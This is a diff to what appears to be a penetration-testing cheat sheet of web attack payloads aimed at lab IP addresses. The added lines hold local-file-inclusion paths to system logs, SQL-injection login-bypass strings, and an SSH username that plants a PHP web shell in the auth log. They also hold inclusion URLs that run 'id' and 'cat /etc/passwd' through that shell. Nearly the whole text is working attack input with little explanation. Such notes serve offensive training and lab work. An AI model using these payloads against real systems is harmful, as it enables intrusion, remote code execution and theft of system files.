@@ -136,6 +136,12 @@ http://web/dept/manage.php?notes=files/comments.txt
 http://web/dept/?lang=/windows/system32/drivers/etc/hosts 
 http://web/dept/?lang=\\192.168.162.46\hello.txt   
 
+Poison
+../../../../../../var/log/auth
+../../../../../../var/log/auth.log
+../../../../../../var/log/apache2/access.log
+../../../../../../xampp/apache/logs/access.log
+
 LFI Scan: 
 python fi-cyberscan.py -t http://192.168.200.5/cyber.php?page= -m1 
 fimap -u 192.168.200.5 
@@ -202,10 +208,11 @@ hello " ; < >
 =================================== 
 Login Bypass
 
-' OR 1=1 -- 
-" OR 1=1 --  
-' OR 1=1;# 
-" OR 1=1 #  
+' or 1=1 -- 
+" or 1=1 --  
+' or 1=1;# 
+" or 1=1 #  
+' or '1=1' --
 ' or 1=1; LIMIT 1;# 
 ' or username LIKE '%admin% 
 admin' -- 
@@ -350,7 +357,12 @@ curl http://192.168.200.5/menu.php?page=../../../../../var/log/apache2/access.lo
 SSH Log Poison
 
 ssh "<?php phpinfo();?>"@192.168.200.5
+ssh '<?php system($_GET ["cmd"]);?>'@192.168.200.5
+
 curl http://192.168.200.5/view.php?page=../../../../../var/log/auth.log
+curl http://192.168.200.5/page.php?file=../../../../../../../var/log/auth
+http://192.168.200.5/page.php?file=../../../../../../../var/log/auth?cmd=id
+http://192.168.200.5/page.php?file=../../../../../../../var/log/auth?cmd=cat /etc/passwd
 
 
 =================================== 
